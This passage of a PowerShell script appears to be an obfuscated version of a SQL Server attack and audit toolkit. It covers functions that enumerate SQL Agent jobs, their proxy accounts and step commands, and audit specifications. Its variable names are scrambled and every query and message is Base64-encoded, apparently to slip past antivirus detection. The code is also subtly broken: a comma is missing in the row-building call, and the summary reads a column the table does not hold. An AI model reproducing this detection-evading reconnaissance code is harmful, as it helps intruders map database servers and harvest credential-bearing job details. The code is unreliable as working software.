            ${_/=\__/=\/===\___} = Get-SQLQuery -Instance $Instance -Query $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAxACAARgBSAE8ATQAgAHMAeQBzAHAAcgBvAGMAZQBzAHMAZQBzACAAVwBIAEUAUgBFACAATABFAEYAVAAoAHAAcgBvAGcAcgBhAG0AXwBuAGEAbQBlACwAIAA4ACkAIAA9ACAAJwBTAFEATABBAGcAZQBuAHQAJwA='))) -Username $Username -Password $Password -SuppressVerbose
            if (${_/=\__/=\/===\___})
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABBAGcAZQBuAHQAIABzAGUAcgB2AGkAYwBlACAAZQBuAGEAYgBsAGUAZAAuAA==')))
                }
            }
            else
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFMAUQBMACAAUwBlAHIAdgBlAHIAIABBAGcAZQBuAHQAIABzAGUAcgB2AGkAYwBlACAAaABhAHMAIABuAG8AdAAgAGIAZQBlAG4AIABzAHQAYQByAHQAZQBkAC4A')))
                }
            }
            ${_/\_/==\/==\_/\__} = Get-SQLDatabaseRoleMember -Username $Username -Password $Password -Instance $Instance -DatabaseName msdb  -SuppressVerbose| % { 
                if($_.RolePrincipalName -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAQQBnAGUAbgB0AFUAcwBlAHIAUgBvAGwAZQB8AFMAUQBMAEEAZwBlAG4AdABSAGUAYQBkAGUAcgBSAG8AbABlAHwAUwBRAEwAQQBnAGUAbgB0AE8AcABlAHIAYQB0AG8AcgBSAG8AbABlAA==')))) {
                    if ($_.PrincipalName -eq ${/=\_/==\__/\/\_/=}) { $_ }
                }
            }
            if($AgentJobPrivs -or (${/=========\__/=\/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))))
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABsAGkAcwB0ACAAZQB4AGkAcwB0AGkAbgBnACAAYQBnAGUAbgB0ACAAagBvAGIAcwAgAGEAcwAgACQAewAvAD0AXABfAC8APQA9AFwAXwBfAC8AXAAvAFwAXwAvAD0AfQAuAA==')))
                }
                $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAEwARQBDAFQAIAAJAHMAdABlAHAAcwAuAGQAYQB0AGEAYgBhAHMAZQBfAG4AYQBtAGUALAANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGoAbwBiAC4AagBvAGIAXwBpAGQAIABhAHMAIABbAEoATwBCAF8ASQBEAF0ALAANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGoAbwBiAC4AbgBhAG0AZQAgAGEAcwAgAFsASgBPAEIAXwBOAEEATQBFAF0ALAANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGoAbwBiAC4AZABlAHMAYwByAGkAcAB0AGkAbwBuACAAYQBzACAAWwBKAE8AQgBfAEQARQBTAEMAUgBJAFAAVABJAE8ATgBdACwADQAKAAkACQAJAAkACQAJAAkACQBTAFUAUwBFAFIAXwBTAE4AQQBNAEUAKABqAG8AYgAuAG8AdwBuAGUAcgBfAHMAaQBkACkAIABhAHMAIABbAEoATwBCAF8ATwBXAE4ARQBSAF0ALAANAAoACQAJAAkACQAJAAkACQAJAHMAdABlAHAAcwAuAHAAcgBvAHgAeQBfAGkAZAAsAA0ACgAJAAkACQAJAAkACQAJAAkAcAByAG8AeABpAGUAcwAuAG4AYQBtAGUAIABhAHMAIABbAHAAcgBvAHgAeQBfAGEAYwBjAG8AdQBuAHQAXQAsAA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAagBvAGIALgBlAG4AYQBiAGwAZQBkACwADQAKAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAHQAZQBwAHMALgBzAGUAcgB2AGUAcgAsAA0ACgAJACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAagBvAGIALgBkAGEAdABlAF8AYwByAGUAYQB0AGUAZAAsACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwB0AGUAcABzAC4AbABhAHMAdABfAHIAdQBuAF8AZABhAHQAZQAsAAkACQAJAAkACQAJAAkACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKAAkACQAJAAkACQAJAAkACQBzAHQAZQBwAHMALgBzAHQAZQBwAF8AbgBhAG0AZQAsAA0ACgAJAAkACQAJAAkACQAJAAkAcwB0AGUAcABzAC4AcwB1AGIAcwB5AHMAdABlAG0ALAANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAdABlAHAAcwAuAGMAbwBtAG0AYQBuAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAARgBSAE8ATQAgAFsAbQBzAGQAYgBdAC4AWwBkAGIAbwBdAC4AWwBzAHkAcwBqAG8AYgBzAF0AIABqAG8AYgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAE4ATgBFAFIAIABKAE8ASQBOACAAWwBtAHMAZABiAF0ALgBbAGQAYgBvAF0ALgBbAHMAeQBzAGoAbwBiAHMAdABlAHAAcwBdACAAcwB0AGUAcABzACAAIAAgACAAIAAgACAAIAANAAoACQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE8ATgAgAGoAbwBiAC4AagBvAGIAXwBpAGQAIAA9ACAAcwB0AGUAcABzAC4AagBvAGIAXwBpAGQADQAKAAkACQAJAAkACQAJAAkAbABlAGYAdAAgAGoAbwBpAG4AIABbAG0AcwBkAGIAXQAuAFsAZABiAG8AXQAuAFsAcwB5AHMAcAByAG8AeABpAGUAcwBdACAAcAByAG8AeABpAGUAcwANAAoACQAJAAkACQAJAAkACQAgAG8AbgAgAHMAdABlAHAAcwAuAHAAcgBvAHgAeQBfAGkAZAAgAD0AIABwAHIAbwB4AGkAZQBzAC4AcAByAG8AeAB5AF8AaQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcASABFAFIARQAgADEAPQAxAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewAvAD0APQBcAC8APQA9AD0AXABfAF8ALwBcAC8AXAAvAFwAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsAXwBfAF8ALwA9AFwAXwAvAFwAXwAvAD0APQBcAC8APQBcAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AC8APQA9AD0AXABfAC8AXABfAC8APQBcAC8APQA9AD0APQB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAewAvAD0APQBcAC8AXABfAF8AXwAvAFwALwBcAF8AXwAvAFwAfQA=')))
                ${_/\_/==\___/=\/\_} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
                if(!(${_/\_/==\___/=\/\_})) {
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAEUAaQB0AGgAZQByACAAbgBvACAAagBvAGIAcwAgAGUAeABpAHMAdAAgAG8AcgAgAHQAaABlACAAYwB1AHIAcgBlAG4AdAAgAGwAbwBnAGkAbgAgACgAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACkAIABkAG8AZQBzAG4AJwB0ACAAaABhAHYAZQAgAHQAaABlACAAcAByAGkAdgBpAGwAZQBnAGUAcwAgAHQAbwAgAHYAaQBlAHcAIAB0AGgAZQBtAC4A')))
                    return
                }
                ${/====\/=\_/\/\/\_} = ${_/\_/==\___/=\/\_}.rows.count
                if(-not $SuppressVerbose){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgACQAewAvAD0APQA9AD0AXAAvAD0AXABfAC8AXAAvAFwALwBcAF8AfQAgAGEAZwBlAG4AdAAgAGoAbwBiAHMAIABmAG8AdQBuAGQALgA=')))
                }
                ${_/\_/==\___/=\/\_} | 
                %{
                    $null = ${/=\_____/\/\/=\__}.Rows.Add($ComputerName,
                    $Instance,
                    $_.database_name
                    $_.JOB_ID,                                                                                                                                                                                        
                    $_.JOB_NAME, 
                    $_.JOB_DESCRIPTION,                                                                                                                                                                                                         
                    $_.JOB_OWNER,
                    $_.proxy_id,    
                    $_.proxy_account, 
                    $_.date_created,
                    $_.last_run_date,                                                                                                                                                                                  
                    $_.enabled,                                                                                                                                                                                                     
                    $_.server,                                                                                                                                                                                        
                    $_.step_name,
                    $_.subsystem,
                    $_.command)
                }
            }
            else
            {
                if(-not $SuppressVerbose){
                    Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAALQAgAFQAaABlACAAYwB1AHIAcgBlAG4AdAAgAGwAbwBnAGkAbgAgACgAJAB7AC8APQBcAF8ALwA9AD0AXABfAF8ALwBcAC8AXABfAC8APQB9ACkAIABkAG8AZQBzACAAbgBvAHQAIABoAGEAdgBlACAAYQBuAHkAIABhAGcAZQBuAHQAIABwAHIAaQB2AGkAbABlAGcAZQBzAC4A')))
                }
                return
            }
            ${__/=\____/\__/==\}.Close()
            ${__/=\____/\__/==\}.Dispose()
        }
        catch
        {
            if(-not $SuppressVerbose)
            {
                ${/=\_______/===\__} = $_.Exception.Message
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
        }        
    }
    End
    {
        if(-not $SuppressVerbose){
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgAEEAZwBlAG4AdAAgAEoAbwBiACAAUwBlAGEAcgBjAGgAIABDAG8AbQBwAGwAZQB0AGUALgA=')))
        }
        ${____/=\__/\/\/=\/} = ${/=\_____/\/\/=\__}.rows.Count
        ${_/\_/\/=\/\__/=\_} = ${/=\_____/\/\/=\__} | group SubSystem | Select Name, Count | sort Count -Descending
        ${/=\/\____/=\___/\} = ${/=\_____/\/\/=\__} | select proxy_credential -Unique | measure | select Count -ExpandProperty Count
        ${_/=\/\_/\/\/\/\/=} = ${/=\_____/\/\/=\__} | select ComputerName -Unique | measure |  select Count -ExpandProperty Count
        ${_/=\_/=\/\/\_/==\} = ${/=\_____/\/\/=\__} | select Instance -Unique | measure |  select Count -ExpandProperty Count
        if(-not $SuppressVerbose){
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUAbgB0ACAASgBvAGIAIABTAHUAbQBtAGEAcgB5AA=='))) 
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAkAHsAXwBfAF8AXwAvAD0AXABfAF8ALwBcAC8AXAAvAD0AXAAvAH0AIABqAG8AYgBzACAAZgBvAHUAbgBkAA==')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAkAHsAXwAvAD0AXAAvAFwAXwAvAFwALwBcAC8AXAAvAFwALwA9AH0AIABhAGYAZgBlAGMAdABlAGQAIABzAHkAcwB0AGUAbQBzAA==')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAkAHsAXwAvAD0AXABfAC8APQBcAC8AXAAvAFwAXwAvAD0APQBcAH0AIABhAGYAZgBlAGMAdABlAGQAIABTAFEATAAgAFMAZQByAHYAZQByACAAaQBuAHMAdABhAG4AYwBlAHMA')))
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAkAHsALwA9AFwALwBcAF8AXwBfAF8ALwA9AFwAXwBfAF8ALwBcAH0AIABwAHIAbwB4AHkAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAB1AHMAZQBkAA==')))
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBnAGUAbgB0ACAASgBvAGIAIABTAHUAbQBtAGEAcgB5ACAAYgB5ACAAUwB1AGIAUwB5AHMAdABlAG0A'))) 
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
            ${_/\_/\/=\/\__/=\_} | 
            % {
                ${_/==\/==\_______/} = $_.Name
                ${__/=\/\_/==\/\/\/} = $_.Count
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAkAHsAXwBfAC8APQBcAC8AXABfAC8APQA9AFwALwBcAC8AXAAvAH0AIAAkAHsAXwAvAD0APQBcAC8APQA9AFwAXwBfAF8AXwBfAF8AXwAvAH0AIABKAG8AYgBzAA==')))
            }
            Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAkAHsAXwBfAF8AXwAvAD0AXABfAF8ALwBcAC8AXAAvAD0AXAAvAH0AIABUAG8AdABhAGwA')))
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0A')))
        }
        ${/=\_____/\/\/=\__}
    }
}
Function  Get-SQLAuditDatabaseSpec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$AuditName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$AuditSpecification,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$AuditAction,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${_/\__/=\/=====\_/} = New-Object -TypeName System.Data.DataTable
        if($AuditName)
        {
            ${_/==\/=\__/\_/\/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGEALgBuAGEAbQBlACAAbABpAGsAZQAgACcAJQAkAEEAdQBkAGkAdABOAGEAbQBlACUAJwA=')))
        }
        else
        {
            ${_/==\/=\__/\_/\/=} = ''
        }
        if($AuditSpecification)
        {
            ${/=\/\___/\/\___/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHMALgBuAGEAbQBlACAAbABpAGsAZQAgACcAJQAkAEEAdQBkAGkAdABTAHAAZQBjAGkAZgBpAGMAYQB0AGkAbwBuACUAJwA=')))
        }
        else
        {
            ${/=\/\___/\/\___/=} = ''
        }
        if($AuditAction)
        {
            ${_/=\__/\_/===\/=\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGQALgBhAHUAZABpAHQAXwBhAGMAdABpAG8AbgBfAG4AYQBtAGUAIABsAGkAawBlACAAJwAlACQAQQB1AGQAaQB0AEEAYwB0AGkAbwBuACUAJwA=')))
        }
        else
        {
            ${_/=\__/\_/===\/=\} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
        $Query = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgAFMARQBMAEUAQwBUACAAIAAnACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAJwAgAGEAcwAgAFsAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnACQASQBuAHMAdABhAG4AYwBlACcAIABhAHMAIABbAEkAbgBzAHQAYQBuAGMAZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAdQBkAGkAdABfAGkAZAAgAGEAcwAgAFsAQQB1AGQAaQB0AEkAZABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEALgBuAGEAbQBlACAAYQBzACAAWwBBAHUAZABpAHQATgBhAG0AZQBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBuAGEAbQBlACAAYQBzACAAWwBBAHUAZABpAHQAUwBwAGUAYwBpAGYAaQBjAGEAdABpAG8AbgBdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGQALgBhAHUAZABpAHQAXwBhAGMAdABpAG8AbgBfAGkAZAAgAGEAcwAgAFsAQQB1AGQAaQB0AEEAYwB0AGkAbwBuAEkAZABdACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGQALgBhAHUAZABpAHQAXwBhAGMAdABpAG8AbgBfAG4AYQBtAGUAIABhAHMAIABbAEEAdQBkAGkAdABBAGMAdABpAG8AbgBdACwADQAKAAkAIAAgACAAIAAgACAAIAAgAGQALgBtAGEAagBvAHIAXwBpAGQALAANAAoACQAgACAAIAAgACAAIAAgACAATwBCAEoARQBDAFQAXwBOAEEATQBFACgAZAAuAG0AYQBqAG8AcgBfAGkAZAApACAAYQBzACAAbwBiAGoAZQBjAHQALAAJAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABzAC4AaQBzAF8AcwB0AGEAdABlAF8AZQBuAGEAYgBsAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAC4AaQBzAF8AZwByAG8AdQBwACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMALgBjAHIAZQBhAHQAZQBfAGQAYQB0AGUALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcwAuAG0AbwBkAGkAZgB5AF8AZABhAHQAZQAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABkAC4AYQB1AGQAaQB0AGUAZABfAHIAZQBzAHUAbAB0AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABGAFIATwBNACAAcwB5AHMALgBzAGUAcgB2AGUAcgBfAGEAdQBkAGkAdABzACAAQQBTACAAYQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASgBPAEkATgAgAHMAeQBzAC4AZABhAHQAYQBiAGEAcwBlAF8AYQB1AGQAaQB0AF8AcwBwAGUAYwBpAGYAaQBjAGEAdABpAG8AbgBzACAAQQBTACAAcwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBOACAAYQAuAGEAdQBkAGkAdABfAGcAdQBpAGQAIAA9ACAAcwAuAGEAdQBkAGkAdABfAGcAdQBpAGQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEoATwBJAE4AIABzAHkAcwAuAGQAYQB0AGEAYgBhAHMAZQBfAGEAdQBkAGkAdABfAHMAcABlAGMAaQBmAGkAYwBhAHQAaQBvAG4AXwBkAGUAdABhAGkAbABzACAAQQBTACAAZAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAATwBOACAAcwAuAGQAYQB0AGEAYgBhAHMAZQBfAHMAcABlAGMAaQBmAGkAYwBhAHQAaQBvAG4AXwBpAGQAIAA9ACAAZAAuAGQAYQB0AGEAYgBhAHMAZQBfAHMAcABlAGMAaQBmAGkAYwBhAHQAaQBvAG4AXwBpAGQAIABXAEgARQBSAEUAIAAxAD0AMQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB7AF8ALwA9AD0AXAAvAD0AXABfAF8ALwBcAF8ALwBcAC8APQB9AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHsALwA9AFwALwBcAF8AXwBfAC8AXAAvAFwAXwBfAF8ALwA9AH0ADQAKACAAIAAgACAAIAAgACAAIAAkAHsAXwAvAD0AXABfAF8ALwBcAF8ALwA9AD0APQBcAC8APQBcAH0A')))
        ${/=\_____/\/\/=\__} = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
        ${_/\__/=\/=====\_/} = ${_/\__/=\/=====\_/} + ${/=\_____/\/\/=\__}
    }
    End
    {
        ${_/\__/=\/=====\_/}
    }
}
Function  Get-SQLAuditServerSpec
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$AuditName,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$AuditSpecification,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$AuditAction,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        ${__/\/\_/=\/\/=\/\} = New-Object -TypeName System.Data.DataTable
        if($AuditName)
        {
            ${_/==\/=\__/\_/\/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGEALgBuAGEAbQBlACAAbABpAGsAZQAgACcAJQAkAEEAdQBkAGkAdABOAGEAbQBlACUAJwA=')))
        }
        else
        {
            ${_/==\/=\__/\_/\/=} = ''
        }
        if($AuditSpecification)
        {
            ${/=\/\___/\/\___/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAHMALgBuAGEAbQBlACAAbABpAGsAZQAgACcAJQAkAEEAdQBkAGkAdABTAHAAZQBjAGkAZgBpAGMAYQB0AGkAbwBuACUAJwA=')))
        }
        else
        {
            ${/=\/\___/\/\___/=} = ''
        }
        if($AuditAction)
        {
            ${_/=\__/\_/===\/=\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABhAG4AZAAgAGQALgBhAHUAZABpAHQAXwBhAGMAdABpAG8AbgBfAG4AYQBtAGUAIABsAGkAawBlACAAJwAlACQAQQB1AGQAaQB0AEEAYwB0AGkAbwBuACUAJwA=')))
        }
        else
        {
            ${_/=\__/\_/===\/=\} = ''
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        ${__/\_/=\/==\_/=\_} = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if(${__/\_/=\/==\_/=\_})
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAFMAdQBjAGMAZQBzAHMALgA=')))
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABJAG4AcwB0AGEAbgBjAGUAIAA6ACAAQwBvAG4AbgBlAGMAdABpAG8AbgAgAEYAYQBpAGwAZQBkAC4A')))
            }
            return
        }
